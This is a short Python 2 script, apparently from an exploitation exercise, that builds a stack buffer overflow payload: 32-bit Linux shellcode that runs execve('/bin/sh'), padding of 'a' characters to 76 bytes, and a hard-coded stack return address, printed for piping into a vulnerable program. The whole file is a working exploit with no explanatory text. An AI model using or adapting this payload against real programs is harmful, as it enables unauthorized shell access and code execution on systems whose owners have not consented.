lenght = 76

shellcode = "\x31\xc0\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0";
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0";

padding = 'a' * (lenght - len(shellcode))

ret = '\x60\xf7\xff\xbf'

payload = shellcode + padding + ret

print payload
